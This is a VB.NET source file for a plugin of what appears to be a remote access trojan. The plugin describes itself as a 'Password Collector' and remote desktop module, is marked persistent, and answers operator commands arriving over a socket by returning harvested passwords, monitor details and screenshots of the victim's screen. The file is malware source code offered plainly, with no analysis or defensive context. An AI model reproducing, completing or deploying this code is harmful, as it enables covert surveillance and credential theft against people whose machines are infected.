Imports System.Windows.Forms
Imports Plugins

Public Class ServerIncluded
    Implements IPlugin

    Public Sep As String = "*%|%*"
    Public Shared splitalt As String = "^||^"
    Public openpasswords As String = "+"
    Public getpasswords As String = "++"
    Public openscreen As String = "@@"
    Public clearscreen As String = "@@@"
    Public changescreen As String = "@!"
    Public getscreen As String = "@"

    Public ReadOnly Property Name As String Implements IPlugin.Name
        Get
            Name = "default"
        End Get
    End Property

    Public ReadOnly Property LongName As String Implements IPlugin.LongName
        Get
            LongName = "Default"
        End Get
    End Property

    Public ReadOnly Property Description As String Implements IPlugin.Description
        Get
            Description = "Remote Desktop, Password Collector, Lock Screen (TODO)"
        End Get
    End Property

    Public ReadOnly Property Type As Boolean Implements IPlugin.Type
        Get
            Type = True
        End Get
    End Property

    Public ReadOnly Property Persistence As Boolean Implements IPlugin.Persistence
        Get
            Persistence = True
        End Get
    End Property

    Function Func(ByVal sock As Integer, Optional ByVal A As String() = Nothing, Optional ByVal B As Byte() = Nothing) As Object() Implements IPlugin.Func
        Dim rtn As Object()
        Select Case A(0)
            Case openpasswords
                ReDim Preserve rtn(0)
                rtn(0) = openpasswords
            Case getpasswords
                ReDim Preserve rtn(0)
                rtn(0) = getpasswords & Sep & PW.GT
            Case openscreen
                ReDim Preserve rtn(0)
                CRDP.Clear()
                Dim s = CRDP.cscreen.Bounds.Size
                Dim k As String = ""
                For Each scr As Screen In Screen.AllScreens
                    k += scr.DeviceName & splitalt
                Next
                rtn(0) = openscreen & Sep & s.Width & Sep & s.Height & Sep & k
            Case clearscreen
                CRDP.Clear()
            Case changescreen
                ReDim Preserve rtn(0)
                CRDP.Clear()
                Dim scr = Screen.AllScreens(A(1))
                CRDP.cscreen = scr
                rtn(0) = changescreen & Sep & scr.Bounds.Size.Width & Sep & scr.Bounds.Size.Height
            Case getscreen
                ReDim Preserve rtn(0)
                Dim SizeOfimage As Integer = A(1)
                Dim Split As Integer = A(2)
                Dim Quality As Integer = A(3)
                Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
                Dim M As New IO.MemoryStream
                Dim CMD As String = getscreen & Sep
                M.Write(SB(CMD), 0, CMD.Length)
                M.Write(Bb, 0, Bb.Length)
                rtn(0) = M.ToArray ''no rc4!
                M.Dispose()
            Case Else
                ReDim Preserve rtn(0)
                rtn(0) = False
        End Select
        Return rtn
    End Function

    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
End Class